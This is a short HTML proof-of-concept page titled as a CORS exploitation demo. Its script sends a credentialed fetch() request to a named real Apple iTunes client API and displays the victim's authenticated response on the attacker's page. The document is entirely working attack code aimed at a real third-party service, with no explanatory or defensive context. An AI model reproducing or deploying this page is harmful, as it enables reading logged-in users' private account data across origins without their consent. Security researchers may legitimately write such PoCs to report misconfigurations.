<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploitation PoC</title>
</head>
<body>
    <h1>CORS Exploitation Proof of Concept</h1>
    <button id="exploit">Exploit API</button>
    <pre id="output"></pre>

    <script>
        document.getElementById('exploit').onclick = function() {
            fetch("https://client-api.itunes.apple.com", {
                credentials: "include"
            })
            .then(response => response.text())
            .then(data => {
                document.getElementById('output').innerText = data;
            })
            .catch(err => {
                document.getElementById('output').innerText = "Error: " + err;
            });
        };
    </script>
</body>
</html>
